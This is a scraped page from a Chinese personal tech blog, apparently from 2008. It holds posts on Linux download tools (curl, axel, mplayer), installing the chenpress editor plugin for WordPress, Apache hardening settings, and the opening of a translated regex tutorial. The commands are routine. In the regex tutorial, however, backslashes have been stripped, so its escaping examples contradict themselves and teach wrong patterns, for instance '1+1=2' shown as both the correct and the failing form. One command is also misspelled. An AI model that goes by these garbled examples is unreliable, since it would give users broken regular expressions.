</code></pre><p>Curl使用格式如下： #curl [选项][下载地址] Curl典型下载如下： #curl -O <a href="http://10.1.27.10/~kennycx/tools/lumaqq_2004-linux_gtk2_x86_with_jre.tar.gz" target="_blank" rel="external">http://10.1.27.10/~kennycx/tools/lumaqq_2004-linux_gtk2_x86_with_jre.tar.gz</a>     使用Curl下载一个文件并保存到当前目录。此外，Curl虽然不支持多线程下载，但它可同时下载多个文件或下载文件的某一部分，可使用如下命令实现： #curl -r 0-199 <a href="http://www.netscape.com/" target="_blank" rel="external">http://www.netscape.com/</a> 获得文件的前200 bytes。     对于常用的代理下载Curl也可轻松实现，具体操作如下： #curl -x 10.1.27.10:1022 ftp://ftp.funet.fi/README 使用代理地址为10.1.27.10端口为1022的代理服务器下载一个文件。 #curl -U user:passwd -x 10.1.27.10:1022 ftp://ftp.funet.fi/README 如果代理服务器需要特别的验证，则需要在user:passwd处输入合法的帐号和密码。</p>
<pre><code>Axel     Axel是命令行下的多线程下载工具，支持断点续传，速度通常情况下是Wget的几倍。可在http://www.linuxfans.org/nuke/modules.php?name=Site_Downloads&amp;amp;amp;op=mydown&amp;amp;amp;did=1697下载。下载后使用如下命令编译安装：
#tar zxvf axel-1.0a.tar.gz
#cd axel-1.0a/
#./configure
#make
#make install
</code></pre><p>基本的用法如下： #axel [选项] [下载目录] [下载地址] 一个典型下载如下： #alex -n 10 -o /home/kennycx/ <a href="http://10.1.27.10/~kennycx/tools/lumaqq_2004-linux_gtk2_x86_with_jre.tar.gz" target="_blank" rel="external">http://10.1.27.10/~kennycx/tools/lumaqq_2004-linux_gtk2_x86_with_jre.tar.gz</a> 用10线程将指定路径的文件下载到/home/kennycx/这个目录下。     本文详细介绍了Linux中常用的下载工具，这些下载工具功能上各有千秋，使用上都比较简单，所以无论是初学者还是Linux高手总有一款适合你。</p>
<pre><code>mimms   mimms是专门下载mms地址格式的流媒体
</code></pre><p>mimms mms://www.movie.com/abc.wmv</p>
<pre><code>mplayer mplayer也可以用来下载rtsp，mms等流媒体。理论上说只要可以播放，就可以下载，感觉mplayer下载速度比mimms快，但mimms可以看到下载进度。
</code></pre><p>mplayer -dumpstream -dumpfile Name.wmv mms://mv.file.com/Name.wmv &gt;name.log 2&gt;&amp;amp;1<br>mplayer -dumpstream -dumpfile Name.rm rtsp://rm.file.com/Name.rm &gt;name.log 2&gt;&amp;amp;1</p>
<p>-dumpstream是转存数据流<br>-dumpfile Name.wmv是指定文件名</p>
<blockquote>
<p>Name.log 2&gt;&amp;amp;1是记录日志，如果出错，可以查看日志</p>
</blockquote>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>


    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2008/03/24/使用chenpress代替wordpress默认编辑器/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="九王爷">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="九王爷">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2008/03/24/使用chenpress代替wordpress默认编辑器/" itemprop="url">
                  使用chenpress代替wordpress默认编辑器
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2008-03-24T09:20:13+08:00">
                2008-03-24
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Other/" itemprop="url" rel="index">
                    <span itemprop="name">Other</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>Wordpress默认的编辑器是<a href="http://tinymce.moxiecode.com/" title="TinyMCE" target="_blank" rel="external">TinyMCE</a>，是一个轻量级的基于Javascript的WYSIWYG编辑器。但是用惯了高级的RTE后，用TinyMCE感觉还是不爽，而且它的html编辑模式还会将换行自动转换成&lt;br /&gt;，这点几乎不可忍受（不知道能不能disable掉）。最终还是决定用<a href="http://groups-beta.google.com/group/ChenPress" title="chenpress" target="_blank" rel="external">chenpress</a>了。chenpress是一个基于<a href="http://www.fckeditor.net/" title="FCKeditor" target="_blank" rel="external">FCKeditor</a>的 wordpress插件，FCKeditor可是大名鼎鼎啊。我找了好久，都没有找到一个理想的下载连接，通过google找到了这里：<a href="http://www.pixelficker.com/chenpress-wysiwyg-for-wordpress/，速度比较慢。为了方便，决定在自己这里host一份。" target="_blank" rel="external">http://www.pixelficker.com/chenpress-wysiwyg-for-wordpress/，速度比较慢。为了方便，决定在自己这里host一份。</a></p>
<p>另外，因为最新的chenpress是3.1.1版本，内置的是FCKeditor2.1.1，对于firefox的支持还不是很完善，我又将内置的FCKeditor升级到最新的FCKeditor2.3.2。应该已经完全支持firefox了。</p>
<p>安装和升级chenpress的步骤如下:</p>
<p>1. 下载chenpress（下载连接见下）。（从哪里下都可以~但是我只用3.1.1的版本测试过~） </p>
<p>2. 将chenpress解压到wordpress的plugin目录中（一般是：wp-contentplugins）。将生成一个chenpress目录。 </p>
<p>3. 在wordpress的plugin设置页将chenpress plugin激活（activate）。 </p>
<p>4. 在users设置页，将Use the visual rich editor when writing勾掉（否则TinyMCE还会出来）。到这步，chenpress已经安装成功了，可以使用了。接下来，升级FCKeditor。 </p>
<p>5. 下载<a href="http://www.fckeditor.net/download" title="donwload FCKeditor" target="_blank" rel="external">FCKeditor2.3.2</a>。 </p>
<p><span id="more-157"></span></p>
<p>6. 解压缩FCKeditor2.3.2.zip，覆盖chenpressFCKeditor目录下所有文件。 </p>
<p>7. 修改chenpressFCKeditorfckconfig.js文件，加入这样一段代码： </p>
<div class="code-div"><code>FCKConfig.ToolbarSets[&amp;quot;WordPressTool&amp;quot;] = [
[&amp;rsquo;Source&amp;rsquo;,&#39;-&amp;rsquo;,&#39;NewPage&amp;rsquo;,&#39;Templates&amp;rsquo;,&#39;Preview&amp;rsquo;,&#39;Print&amp;rsquo;],
[&amp;rsquo;Cut&amp;rsquo;,&#39;Copy&amp;rsquo;,&#39;Paste&amp;rsquo;,&#39;PasteText&amp;rsquo;,&#39;PasteWord&amp;rsquo;],
[&amp;rsquo;Undo&amp;rsquo;,&#39;Redo&amp;rsquo;,&#39;-&amp;rsquo;,&#39;Find&amp;rsquo;,&#39;Replace&amp;rsquo;,&#39;SpellCheck&amp;rsquo;],
[&amp;rsquo;Form&amp;rsquo;,&#39;Checkbox&amp;rsquo;,&#39;Radio&amp;rsquo;,&#39;TextField&amp;rsquo;,&#39;Textarea&amp;rsquo;,&#39;Select&amp;rsquo;,&#39;Button&amp;rsquo;,&#39;ImageButton&amp;rsquo;,&#39;HiddenField&amp;rsquo;],
[&amp;rsquo;Link&amp;rsquo;,&#39;Unlink&amp;rsquo;,&#39;Anchor&amp;rsquo;],
[&amp;rsquo;Image&amp;rsquo;,&#39;Flash&amp;rsquo;,&#39;Table&amp;rsquo;,&#39;Rule&amp;rsquo;,&#39;Smiley&amp;rsquo;,&#39;SpecialChar&amp;rsquo;,&#39;PageBreak&amp;rsquo;,&#39;UniversalKey&amp;rsquo;],
[&amp;rsquo;OrderedList&amp;rsquo;,&#39;UnorderedList&amp;rsquo;,&#39;Outdent&amp;rsquo;,&#39;Indent&amp;rsquo;,&#39;JustifyLeft&amp;rsquo;,&#39;JustifyCenter&amp;rsquo;,&#39;JustifyRight&amp;rsquo;,&#39;JustifyFull&amp;rsquo;],
[&amp;rsquo;Bold&amp;rsquo;,&#39;Italic&amp;rsquo;,&#39;Underline&amp;rsquo;,&#39;StrikeThrough&amp;rsquo;,&#39;Subscript&amp;rsquo;,&#39;Superscript&amp;rsquo;,&#39;RemoveFormat&amp;rsquo;],
&amp;lsquo;/&amp;rsquo;,
[&amp;rsquo;Style&amp;rsquo;,&#39;FontFormat&amp;rsquo;,&#39;FontName&amp;rsquo;,&#39;FontSize&amp;rsquo;],
[&amp;rsquo;TextColor&amp;rsquo;,&#39;BGColor&amp;rsquo;],
[&amp;rsquo;About&amp;rsquo;] ] ;</code></div>

<p>8. 在chenpress.php中，找到window.onload这个javascript的function，加入这段代码： </p>
<div class="code-div"><code>if (!document.getElementById(&#39;content&#39;)) { return; }</code></div>

<p>9. Goal! </p>
<p>下载连接:</p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>


    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2008/03/24/Best_of_Vim_Tips_中文版/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="九王爷">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="九王爷">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2008/03/24/Best_of_Vim_Tips_中文版/" itemprop="url">
                  Best of Vim Tips 中文版
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2008-03-24T09:03:35+08:00">
                2008-03-24
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Other/" itemprop="url" rel="index">
                    <span itemprop="name">Other</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            
          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>


    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2008/03/23/巩固Apache配置的安全方法20则/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="九王爷">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="九王爷">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2008/03/23/巩固Apache配置的安全方法20则/" itemprop="url">
                  巩固Apache配置的安全方法20则
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2008-03-23T22:52:56+08:00">
                2008-03-23
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Linux/" itemprop="url" rel="index">
                    <span itemprop="name">Linux</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>声明：关于安全的事情没有保证的或者绝对的。这些建议可以让你的服务器更安全，但不要认为遵循这些建议后你的服务器就理所当然是安全的。另外，在这些建议中有的建议可能会降低服务器性能或者因为你的环境引起问题。我建议所作的任何改变是否适合你的需求完全由你决定。换句话说，那是你的风险。</p>
<p>一、确保你安装的是最新的补丁</p>
<p>如果门是敞开的话，在窗户上加锁就毫无意义。同样道理，如果你没有打补丁，继续下面的操作就没有什么必要。</p>
<p>二、隐藏Apache的版本号及其它敏感信息</p>
<p>默认情况下，很多Apache安装时会显示版本号及操作系统版本，甚至会显示服务器上安装的是什么样的Apache模块。这些信息可以为黑客所用，并且黑客还可以从中得知你所配置的服务器上的很多设置都是默认状态。</p>
<p>这里有两条语句，你需要添加到你的httpd.conf文件中：</p>
<p>ServerSignature Off</p>
<p>ServerTokens Prod</p>
<p>ServerSignature 出现在Apache所产生的像404页面、目录列表等页面的底部。ServerTokens目录被用来判断Apache会在Server HTTP响应包的头部填充什么信息。如果把ServerTokens设为Prod，那么HTTP响应包头就会被设置成：</p>
<p>Server：Apache</p>
<p>如果你非常想尝试其它事物，你可以通过编辑源代码改成不是Apache的其它东西，或者你可以通过下面将要介绍的mod_security实现。</p>
<p>三、确保Apache以其自身的用户账号和组运行</p>
<p>有的Apache安装过程使得服务器以nobody的用户运行，所以，假定Apache和你的邮件服务器都是以nobody的账号运行的，那么通过Apache发起的攻击就可能同时攻击到邮件服务器，反之亦然。</p>
<p>User apache</p>
<p>Group apache</p>
<p>四、确保web根目录之外的文件没有提供服务</p>
<p>我们不让Apache访问web根目录之外的任何文件。假设你的所以web站点文件都放在一个目录下（例如/web），你可以如下设置：</p>
<p>Order Deny,Allow</p>
<p>Deny from all</p>
<p>Options None</p>
<p>AllowOverride None</p>
<p>Order Allow,Deny</p>
<p>Allow from all</p>
<p>注意，因为我们设置Opitins None 和AllowOverride None，这将关闭服务器的所有Option和Override。你现在必须明确把每个目录设置成Option或者Override。</p>
<p>五、关闭目录浏览</p>
<p>你可以在Directory标签内用Option命令来实现这个功能。设置Option为None或者－Indexes。</p>
<p>Options -Indexes</p>
<p>六、关闭includes</p>
<p>这也可以通过在Directory标签内使用Option命令来实现。设置Option为None或者－Includes。</p>
<p>Options -Includes</p>
<p>七、关闭CGI执行程序</p>
<p>如果你不用CGI，那么请把它关闭。在目录标签中把选项设置成None或-ExecCGI就可以：</p>
<p>Options -ExecCGI</p>
<p>八、禁止Apache遵循符号链接</p>
<p>同上，把选项设置成None或-FollowSymLinks：</p>
<p>Options -FollowSymLinks</p>
<p>九、关闭多重选项</p>
<p>如果想关闭所有选项，很简单：</p>
<p>Options None</p>
<p>如果只想关系一些独立的选项，则通过将Options做如下设置可实现：</p>
<p>Options -ExecCGI -FollowSymLinks -Indexes</p>
<p>十、关闭对.htaccess文件的支持</p>
<p>在一个目录标签中实现：</p>
<p>AllowOverride None</p>
<p>如果需要重载，则保证这些文件不能够被下载，或者把文件名改成非.htaccess文件。比如，我们可以改成.httpdoverride文件，然后像下面这样阻止所有以.ht打头的文件：</p>
<p>AccessFileName .httpdoverride</p>
<p>Order allow,deny</p>
<p>Deny from all</p>
<p>Satisfy All</p>
<p>十一、运行mod_security</p>
<p>Run mod_security是O’Reilly出版社出版的Apache Security一书的作者，Ivan Ristic所写的一个非常好用的一个Apache模块。可以用它实现以下功能：</p>
<p>·简单过滤</p>
<p>·基于过滤的常规表达式</p>
<p>·URL编码验证</p>
<p>·Unicode编码验证</p>
<p>·审计</p>
<p>·空字节攻击防止</p>
<p>·上载存储限制</p>
<p>·服务器身份隐藏</p>
<p>·内置的Chroot支持</p>
<p>·更多其它功能</p>
<p>十二、关闭任何不必要的模块</p>
<p>Apache通常会安装几个模块，浏览Apache的module documentation，了解已安装的各个模块是做什么用的。很多情况下，你会发现并不需要激活那些模块。</p>
<p>找到httpd.conf中包含LoadModule的代码。要关闭这些模块，只需要在代码行前添加一个#号。要找到正在运行的模块，可以用以下语句：</p>
<p>grep LoadModule httpd.conf</p>
<p>以下模块通常被激活而并无大用：mod_imap, mod_include, mod_info, mod_userdir, mod_status, mod_cgi, mod_autoindex。</p>
<p>更多方法请见<a href="http://www.petefreitag.com/item/505.cfm" target="_blank" rel="external">http://www.petefreitag.com/item/505.cfm</a></p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>


    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2008/03/23/深入浅出之正则表达式（一）/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="九王爷">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="九王爷">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2008/03/23/深入浅出之正则表达式（一）/" itemprop="url">
                  深入浅出之正则表达式（一）
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2008-03-23T22:52:56+08:00">
                2008-03-23
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Other/" itemprop="url" rel="index">
                    <span itemprop="name">Other</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p><span lang="ZH-CN" style="font-family: 宋体;">前言：</span><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span lang="ZH-CN" style="font-family: 宋体;">半年前我对正则表达式产生了兴趣，在网上查找过不少资料，看过不少的教程，最后在使用一个正则表达式工具</span>RegexBuddy<span lang="ZH-CN" style="font-family: 宋体;">时发现他的教程写的非常好，可以说是我目前见过最好的正则表达式教程。于是一直想把他翻译过来。这个愿望直到这个五一长假才得以实现，结果就有了这篇文章。关于本文的名字，使用</span>&ldquo;<span lang="ZH-CN" style="font-family: 宋体;">深入浅出</span>&rdquo;<span lang="ZH-CN" style="font-family: 宋体;">似乎已经太俗。但是通读原文以后，觉得只有用</span>&ldquo;<span lang="ZH-CN" style="font-family: 宋体;">深入浅出</span>&rdquo;<span lang="ZH-CN" style="font-family: 宋体;">才能准确的表达出该教程给我的感受，所以也就不能免俗了。</span><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span lang="ZH-CN" style="font-family: 宋体;">本文是</span>Jan Goyvaerts<span lang="ZH-CN" style="font-family: 宋体;">为</span>RegexBuddy<span lang="ZH-CN" style="font-family: 宋体;">写的教程的译文，版权归原作者所有，欢迎转载。但是为了尊重原作者和译者的劳动，请注明出处！谢谢！</span></p>
<p><strong><span style="font-size: 18pt;"><o:p>&nbsp;</o:p></span></strong></p>
<p><strong><span style=""><span style="">1.<span style="font-family: 'Times New Roman'; font-style: normal; font-variant: normal; font-weight: normal; font-size: 7pt; line-height: normal; font-size-adjust: none; font-stretch: normal;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span></span></span>**</strong><span lang="ZH-CN" style="font-family: 宋体;">什么是正则表达式</span><o:p></o:p>**</p>
<p><span lang="ZH-CN" style="font-family: 宋体;">基本说来，正则表达式是一种用来描述一定数量文本的模式。</span>Regex<span lang="ZH-CN" style="font-family: 宋体;">代表</span>Regular Express<span lang="ZH-CN" style="font-family: 宋体;">。本文将用</span>&lt;&lt;regex&gt;&gt;<span lang="ZH-CN" style="font-family: 宋体;">来表示一段具体的正则表达式。</span></p>
<p><span lang="ZH-CN" style="font-family: 宋体;">一段文本就是最基本的模式，简单的匹配相同的文本。</span></p>
<p><o:p>&nbsp;</o:p></p>
<p><strong><span style=""><span style="">2.<span style="font-family: 'Times New Roman'; font-style: normal; font-variant: normal; font-weight: normal; font-size: 7pt; line-height: normal; font-size-adjust: none; font-stretch: normal;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span></span></span>**</strong><span lang="ZH-CN" style="font-family: 宋体;">不同的正则表达式引擎</span><o:p></o:p>**</p>
<p><span lang="ZH-CN" style="font-family: 宋体;">正则表达式引擎是一种可以处理正则表达式的软件。通常，引擎是更大的应用程序的一部分。在软件世界，不同的正则表达式并不互相兼容。本教程会集中讨论</span>Perl 5 <span lang="ZH-CN" style="font-family: 宋体;">类型的引擎，因为这种引擎是应用最广泛的引擎。同时我们也会提到一些和其他引擎的区别。许多近代的引擎都很类似，但不完全一样。例如</span>.NET<span lang="ZH-CN" style="font-family: 宋体;">正则库，</span>JDK<span lang="ZH-CN" style="font-family: 宋体;">正则包。</span></p>
<p><o:p>&nbsp;</o:p></p>
<p><strong><span style=""><span style="">3.<span style="font-family: 'Times New Roman'; font-style: normal; font-variant: normal; font-weight: normal; font-size: 7pt; line-height: normal; font-size-adjust: none; font-stretch: normal;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span></span></span>**</strong><span lang="ZH-CN" style="font-family: 宋体;">文字符号</span><o:p></o:p>**</p>
<p><span lang="ZH-CN" style="font-family: 宋体;">最基本的正则表达式由单个文字符号组成。如</span>&lt;&lt;a&gt;&gt;<span lang="ZH-CN" style="font-family: 宋体;">，它将匹配字符串中第一次出现的字符&ldquo;</span>a<span lang="ZH-CN" style="font-family: 宋体;">&rdquo;。如对字符串&ldquo;</span>Jack is a boy<span lang="ZH-CN" style="font-family: 宋体;">&rdquo;。&ldquo;</span>J<span lang="ZH-CN" style="font-family: 宋体;">&rdquo;后的&ldquo;</span>a<span lang="ZH-CN" style="font-family: 宋体;">&rdquo;将被匹配。而第二个&ldquo;</span>a<span lang="ZH-CN" style="font-family: 宋体;">&rdquo;将不会被匹配。</span></p>
<p><span lang="ZH-CN" style="font-family: 宋体;">正则表达式也可以匹配第二个&ldquo;</span>a<span lang="ZH-CN" style="font-family: 宋体;">&rdquo;，这必须是你告诉正则表达式引擎从第一次匹配的地方开始搜索。在文本编辑器中，你可以使用&ldquo;查找下一个&rdquo;。在编程语言中，会有一个函数可以使你从前一次匹配的位置开始继续向后搜索。</span></p>
<p><span lang="ZH-CN" style="font-family: 宋体;">类似的，</span>&lt;&lt;cat&gt;&gt;<span lang="ZH-CN" style="font-family: 宋体;">会匹配&ldquo;</span>About cats and dogs<span lang="ZH-CN" style="font-family: 宋体;">&rdquo;中的&ldquo;</span>cat<span lang="ZH-CN" style="font-family: 宋体;">&rdquo;。这等于是告诉正则表达式引擎，找到一个</span>&lt;&lt;c&gt;&gt;<span lang="ZH-CN" style="font-family: 宋体;">，紧跟一个</span>&lt;&lt;a&gt;&gt;<span lang="ZH-CN" style="font-family: 宋体;">，再跟一个</span>&lt;&lt;t&gt;&gt;<span lang="ZH-CN" style="font-family: 宋体;">。</span></p>
<p><span lang="ZH-CN" style="font-family: 宋体;">要注意，正则表达式引擎缺省是大小写敏感的。除非你告诉引擎忽略大小写，否则</span>&lt;&lt;cat&gt;&gt;<span lang="ZH-CN" style="font-family: 宋体;">不会匹配&ldquo;</span>Cat<span lang="ZH-CN" style="font-family: 宋体;">&rdquo;。</span></p>
<p><o:p>&nbsp;</o:p></p>
<p><span style="font-family: Symbol;"><span style="">&middot;<span style="font-family: 'Times New Roman'; font-style: normal; font-variant: normal; font-weight: normal; font-size: 7pt; line-height: normal; font-size-adjust: none; font-stretch: normal;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span></span></span><span lang="ZH-CN" style="font-family: 宋体;">特殊字符</span><o:p></o:p></p>
<p><span lang="ZH-CN" style="font-family: 宋体;">对于文字字符，有</span>11<span lang="ZH-CN" style="font-family: 宋体;">个字符被保留作特殊用途。他们是：</span></p>
<p>[ ]  ^ $ . | ? * + ( )</p>
<p><span lang="ZH-CN" style="font-family: 宋体;">这些特殊字符也被称作元字符。</span></p>
<p><span lang="ZH-CN" style="font-family: 宋体;">如果你想在正则表达式中将这些字符用作文本字符，你需要用反斜杠&ldquo;</span><span lang="ZH-CN" style="font-family: 宋体;">&rdquo;对其进行换码</span><span lang="ZH-CN"> </span>(escape)<span lang="ZH-CN" style="font-family: 宋体;">。例如你想匹配&ldquo;</span>1+1=2<span lang="ZH-CN" style="font-family: 宋体;">&rdquo;，正确的表达式为</span>&lt;&lt;1+1=2&gt;&gt;.</p>
<p><span lang="ZH-CN" style="font-family: 宋体;">需要注意的是，</span>&lt;&lt;1+1=2&gt;&gt;<span lang="ZH-CN" style="font-family: 宋体;">也是有效的正则表达式。但它不会匹配&ldquo;</span>1+1=2<span lang="ZH-CN" style="font-family: 宋体;">&rdquo;，而会匹配&ldquo;</span>123+111=234<span lang="ZH-CN" style="font-family: 宋体;">&rdquo;中的&ldquo;</span>111=2<span lang="ZH-CN" style="font-family: 宋体;">&rdquo;。因为&ldquo;</span>+<span lang="ZH-CN" style="font-family: 宋体;">&rdquo;在这里表示特殊含义（重复</span>1<span lang="ZH-CN" style="font-family: 宋体;">次到多次）。</span></p>
<p><span lang="ZH-CN" style="font-family: 宋体;">在编程语言中，要注意，一些特殊的字符会先被编译器处理，然后再传递给正则引擎。因此正则表达式</span>&lt;&lt;1+2=2&gt;&gt;<span lang="ZH-CN" style="font-family: 宋体;">在</span>C++<span lang="ZH-CN" style="font-family: 宋体;">中要写成&ldquo;</span>1+1=2<span lang="ZH-CN" style="font-family: 宋体;">&rdquo;。为了匹配&ldquo;</span>C:temp<span lang="ZH-CN" style="font-family: 宋体;">&rdquo;，你要用正则表达式</span>&lt;&lt;C:\temp&gt;&gt;<span lang="ZH-CN" style="font-family: 宋体;">。而在</span>C++<span lang="ZH-CN" style="font-family: 宋体;">中，正则表达式则变成了&ldquo;</span>C:\temp<span lang="ZH-CN" style="font-family: 宋体;">&rdquo;。</span></p>
<p><o:p>&nbsp;</o:p></p>
<p><span style="font-family: Symbol;"><span style="">&middot;<span style="font-family: 'Times New Roman'; font-style: normal; font-variant: normal; font-weight: normal; font-size: 7pt; line-height: normal; font-size-adjust: none; font-stretch: normal;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span></span></span><span lang="ZH-CN" style="font-family: 宋体;">不可显示字符</span><o:p></o:p></p>
<p><span lang="ZH-CN" style="font-family: 宋体;">可以使用特殊字符序列来代表某些不可显示字符：</span></p>
<p>&lt;&lt;t&gt;&gt;<span lang="ZH-CN" style="font-family: 宋体;">代表</span>Tab(0x09)</p>
<p>&lt;&lt;r&gt;&gt;<span lang="ZH-CN" style="font-family: 宋体;">代表回车符</span>(0x0D)</p>
<p>&lt;&lt;n&gt;&gt;<span lang="ZH-CN" style="font-family: 宋体;">代表换行符</span>(0x0A)</p>
<p><span lang="ZH-CN" style="font-family: 宋体;">要注意的是</span>Windows<span lang="ZH-CN" style="font-family: 宋体;">中文本文件使用&ldquo;</span>rn<span lang="ZH-CN" style="font-family: 宋体;">&rdquo;来结束一行而</span>Unix<span lang="ZH-CN" style="font-family: 宋体;">使用&ldquo;</span>n<span lang="ZH-CN" style="font-family: 宋体;">&rdquo;。</span></p>
<p><o:p>&nbsp;</o:p></p>
<p><strong><span style=""><span style="">4.<span style="font-family: 'Times New Roman'; font-style: normal; font-variant: normal; font-weight: normal; font-size: 7pt; line-height: normal; font-size-adjust: none; font-stretch: normal;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span></span></span>**</strong><span lang="ZH-CN" style="font-family: 宋体;">正则表达式引擎的内部工作机制</span><o:p></o:p>**</p>
<p><span lang="ZH-CN" style="font-family: 宋体;">知道正则表达式引擎是如何工作的有助于你很快理解为何某个正则表达式不像你期望的那样工作。</span></p>
<p><span lang="ZH-CN" style="font-family: 宋体;">有两种类型的引擎：文本导向</span>(text-directed)<span lang="ZH-CN" style="font-family: 宋体;">的引擎和正则导向</span>(regex-directed)<span lang="ZH-CN" style="font-family: 宋体;">的引擎。</span>Jeffrey Friedl<span lang="ZH-CN" style="font-family: 宋体;">把他们称作</span>DFA<span lang="ZH-CN" style="font-family: 宋体;">和</span>NFA<span lang="ZH-CN" style="font-family: 宋体;">引擎。本文谈到的是正则导向的引擎。这是因为一些非常有用的特性，如&ldquo;惰性&rdquo;量词</span>(lazy quantifiers)<span lang="ZH-CN" style="font-family: 宋体;">和反向引用</span>(backreferences)<span lang="ZH-CN" style="font-family: 宋体;">，只能在正则导向的引擎中实现。所以毫不意外这种引擎是目前最流行的引擎。</span></p>
